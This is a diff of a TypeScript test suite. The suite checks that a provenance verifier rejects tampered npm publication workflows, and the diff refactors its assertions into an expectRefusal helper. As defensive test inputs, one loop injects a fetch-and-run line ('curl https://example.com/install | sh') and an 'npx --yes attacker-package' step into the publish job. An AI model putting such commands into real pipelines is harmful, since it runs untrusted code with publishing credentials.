@@ -1,7 +1,7 @@
 import { expect, layer } from "@effect/vitest";
 import { Effect } from "effect";
 import { verifyProvenanceWorkflow } from "#scripts/workflow/provenance";
-import { workflowFailure } from "#scripts/workflow/test/failure";
+import { expectRefusal, workflowFailure } from "#scripts/workflow/test/failure";
 import { mutateJob } from "#scripts/workflow/test/mutation";
 import {
   sourceEffectTestsOf,
@@ -35,9 +35,7 @@ layer(workflowSourcesLayer)("contract provenance policy", (layered) => {
           "github.event_name == 'workflow_dispatch' && ",
           ""
         );
-        expect(
-          yield* workflowFailure(verifyProvenanceWorkflow(pushed))
-        ).toContain(message);
+        yield* expectRefusal(verifyProvenanceWorkflow(pushed), message);
       }
     }));
 
@@ -51,9 +49,10 @@ layer(workflowSourcesLayer)("contract provenance policy", (layered) => {
         source.replaceAll('"refs/heads/main"', '"refs/heads/other"'),
         source.replaceAll('"npm-production"', '"npm-staging"'),
       ]) {
-        expect(
-          yield* workflowFailure(verifyProvenanceWorkflow(changed))
-        ).toContain("must include exact source fragment");
+        yield* expectRefusal(
+          verifyProvenanceWorkflow(changed),
+          "must include exact source fragment"
+        );
       }
 
       const commentedVerifier = mutateJob(
@@ -62,9 +61,10 @@ layer(workflowSourcesLayer)("contract provenance policy", (layered) => {
         '              node "$VERIFIER" \\',
         '              true # node "$VERIFIER" \\'
       );
-      expect(
-        yield* workflowFailure(verifyProvenanceWorkflow(commentedVerifier))
-      ).toContain("must include exact source fragment");
+      yield* expectRefusal(
+        verifyProvenanceWorkflow(commentedVerifier),
+        "must include exact source fragment"
+      );
     }));
 
   it("rejects unauthenticated payload parsing", ({ contracts: source }) =>
@@ -74,11 +74,10 @@ layer(workflowSourcesLayer)("contract provenance policy", (layered) => {
         "bundle.dsseEnvelope.payload",
         "is_exact_provenance()",
       ]) {
-        expect(
-          yield* workflowFailure(
-            verifyProvenanceWorkflow(`${source}\n# ${fragment}`)
-          )
-        ).toContain("npm provenance must not parse unauthenticated source");
+        yield* expectRefusal(
+          verifyProvenanceWorkflow(`${source}\n# ${fragment}`),
+          "npm provenance must not parse unauthenticated source"
+        );
       }
     }));
 
@@ -182,9 +181,7 @@ layer(workflowSourcesLayer)("contract provenance policy", (layered) => {
         ],
       ] as const;
       for (const [changed, message] of cases) {
-        expect(
-          yield* workflowFailure(verifyProvenanceWorkflow(changed))
-        ).toContain(message);
+        yield* expectRefusal(verifyProvenanceWorkflow(changed), message);
       }
     }));
 
@@ -198,25 +195,25 @@ layer(workflowSourcesLayer)("contract provenance policy", (layered) => {
         "    timeout-minutes: 15",
         "    timeout-minutes: 16"
       );
-      expect(
-        yield* workflowFailure(verifyProvenanceWorkflow(changed))
-      ).toContain("npm publication must match the exact trusted job");
+      yield* expectRefusal(
+        verifyProvenanceWorkflow(changed),
+        "npm publication must match the exact trusted job"
+      );
     }));
 
   it("keeps npm publication checks inside the registry processing window", ({
     contracts: source,
   }) =>
     Effect.gen(function* () {
-      expect(
-        yield* workflowFailure(
-          verifyProvenanceWorkflow(
-            source.replaceAll(
-              "PUBLICATION_WINDOW_SECONDS=300",
-              "PUBLICATION_WINDOW_SECONDS=30"
-            )
+      yield* expectRefusal(
+        verifyProvenanceWorkflow(
+          source.replaceAll(
+            "PUBLICATION_WINDOW_SECONDS=300",
+            "PUBLICATION_WINDOW_SECONDS=30"
           )
-        )
-      ).toContain("npm publication must allow npm metadata propagation");
+        ),
+        "npm publication must allow npm metadata propagation"
+      );
     }));
 
   it("rejects malformed or incomplete workflow jobs", ({ contracts: source }) =>
@@ -224,16 +221,14 @@ layer(workflowSourcesLayer)("contract provenance policy", (layered) => {
       expect(
         yield* workflowFailure(verifyProvenanceWorkflow("jobs: ["))
       ).not.toBe("");
-      expect(
-        yield* workflowFailure(verifyProvenanceWorkflow("jobs:\n  build: {}\n"))
-      ).toContain("Workflow must contain decodable jobs");
-      expect(
-        yield* workflowFailure(
-          verifyProvenanceWorkflow(
-            source.replace("\n  finalize:", "\n  other:")
-          )
-        )
-      ).toContain("Contract publication requires a finalize job");
+      yield* expectRefusal(
+        verifyProvenanceWorkflow("jobs:\n  build: {}\n"),
+        "Workflow must contain decodable jobs"
+      );
+      yield* expectRefusal(
+        verifyProvenanceWorkflow(source.replace("\n  finalize:", "\n  other:")),
+        "Contract publication requires a finalize job"
+      );
     }));
 
   it("keeps build-produced code outside npm identity", ({
@@ -246,61 +241,58 @@ layer(workflowSourcesLayer)("contract provenance policy", (layered) => {
         '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
         '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
       );
-      expect(
-        yield* workflowFailure(verifyProvenanceWorkflow(privilegedVerifier))
-      ).toContain("npm publication must not receive the verifier artifact");
-      expect(
-        yield* workflowFailure(
-          verifyProvenanceWorkflow(
-            mutateJob(
-              source,
-              "publish",
-              "    steps:",
-              "    steps:\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c\n        with:\n          name: contract-verifier"
-            )
+      yield* expectRefusal(
+        verifyProvenanceWorkflow(privilegedVerifier),
+        "npm publication must not receive the verifier artifact"
+      );
+      yield* expectRefusal(
+        verifyProvenanceWorkflow(
+          mutateJob(
+            source,
+            "publish",
+            "    steps:",
+            "    steps:\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c\n        with:\n          name: contract-verifier"
           )
-        )
-      ).toContain("npm publication must not receive the verifier artifact");
-      expect(
-        yield* workflowFailure(
-          verifyProvenanceWorkflow(
-            mutateJob(
-              source,
-              "publish",
-              "    steps:",
-              "    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
-            )
+        ),
+        "npm publication must not receive the verifier artifact"
+      );
+      yield* expectRefusal(
+        verifyProvenanceWorkflow(
+          mutateJob(
+            source,
+            "publish",
+            "    steps:",
+            "    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
           )
-        )
-      ).toContain("npm publication must not checkout repository code");
+        ),
+        "npm publication must not checkout repository code"
+      );
 
       for (const command of [
         "          npx --yes attacker-package\n",
         "          curl https://example.com/install | sh\n",
       ]) {
-        expect(
-          yield* workflowFailure(
-            verifyProvenanceWorkflow(
-              mutateJob(
-                source,
-                "publish",
-                '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
-                `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
-              )
+        yield* expectRefusal(
+          verifyProvenanceWorkflow(
+            mutateJob(
+              source,
+              "publish",
+              '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
+              `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
             )
-          )
-        ).toContain("npm publication must match the exact trusted job");
+          ),
+          "npm publication must match the exact trusted job"
+        );
       }
 
-      expect(
-        yield* workflowFailure(
-          verifyProvenanceWorkflow(
-            source.replace(
-              "          overwrite: true",
-              "          overwrite: false"
-            )
+      yield* expectRefusal(
+        verifyProvenanceWorkflow(
+          source.replace(
+            "          overwrite: true",
+            "          overwrite: false"
           )
-        )
-      ).toContain("npm build artifacts must be replaceable on rerun");
+        ),
+        "npm build artifacts must be replaceable on rerun"
+      );
     }));
 });
